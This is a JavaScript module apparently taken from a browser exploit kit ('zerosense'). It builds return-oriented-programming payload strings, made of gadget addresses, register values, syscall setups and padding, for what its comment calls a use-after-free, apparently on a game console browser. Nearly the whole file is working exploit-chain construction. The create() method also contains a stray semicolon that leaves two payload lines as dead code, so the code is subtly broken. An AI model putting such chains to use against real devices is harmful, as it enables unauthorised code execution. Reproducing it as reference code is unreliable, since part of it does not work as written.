/*eslint-disable no-param-reassign */
var Util = require('zerosense/Util');

class ChainBuilder {
	
	constructor(offsets) {
		this.offsets = offsets;
		
		this.data = "";
		this.addrGtemp = 0x8d000000;
		
		/**
		 * spExit is the address of 0x39C1868 in 0x8fd8xxxx, which is the callstack of the uaf minus 2
		 * Address to the double, offset by -0x10
		 */
		this.addrSpExit = 0x8FD8DCD0 - 0x10;
	}
	
	static setup2(addr) {
		var commas = unescape("\u8282");
		
		return unescape("\u0102\u7efb")
			+ Util.pad(0x30, commas)
			+ Util.int32(addr)
			+ unescape("\ufb7e");
	}
	
	static setup1(addr) {		
		return unescape("\u4141\u7efa")
			+ Util.int32(addr)
			+ unescape("\ufa7e");
	}

	setGtemp(addr) {
		this.addrGtemp = addr;
		
		return this;
	}
	
	create() {
		var AA = unescape("\u4141");
		
		var start = unescape("\u4141\u2a2f")
		
			//////////
		
			+ Util.int32(this.offsets.addrGadget1) // -> r0, lr
			+ Util.int32(this.offsets.addrToc) // -> r2
			+ Util.pad(0x20, AA);
		
			//////////
		
			+ Util.int64(0x0, this.offsets.addrToc) // -> r2
			+ Util.pad(0x70, AA);
			
		var end = Util.int64(0x0, this.offsets.addrGadgetMod8)
		
			//////////
		
			+ unescape("\u2f2a");
			
		return start + this.data + end;
	}
	
	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out) {
		var AA = unescape("\u4141");
		
		r31out = r31out || this.addrGtemp;
		
		this.data += Util.int64(0x0, this.offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.addrGtemp)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, this.offsets.addrGadgetMod1)
			+ Util.pad(0x5C, AA)
			+ Util.int32(sc)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, r3)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, this.offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.addrGtemp)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, this.offsets.addrGadgetMod4a)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31out)
			
			//////////
			
			+ Util.int64(0x0, this.addrSpExit)
			+ Util.pad(0x8, AA);
			
		return this;
	}
	
	callsub(sub, r3, r4, r5, r6, r7, r8, r9, r10, r11, frameSize, r31in, r31out) {
		var AA = unescape("\u4141");
		var minFrameSize = 0x20;
		
		if (frameSize < minFrameSize) {
			throw "callsub cannot use the gadget at 0x" + sub.toString(16) + " because its frame size is < 0x" + minFrameSize.toString(16) + "!";
		}
		
		r31in = r31in || this.addrGtemp;
		r31out = r31out || this.addrGtemp;
		
		this.data += Util.int64(0x0, this.offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.addrGtemp)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, this.offsets.addrGadgetMod1)
			+ Util.pad(0x50, AA)
			+ Util.pad(0xC, AA)
			+ Util.int32(r11)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, r3)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, this.offsets.addrGadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31in)
			
			//////////
			
			+ Util.pad(0x10, AA)
			+ Util.int64(0x0, sub)
			+ Util.pad(frameSize - minFrameSize)
			+ Util.int64(0x0, r31out)
			
			//////////
			
			+ Util.int64(0x0, this.addrSpExit)
			+ Util.pad(0x8, AA);
		
		return this;
	}
	
}

module.exports = ChainBuilder;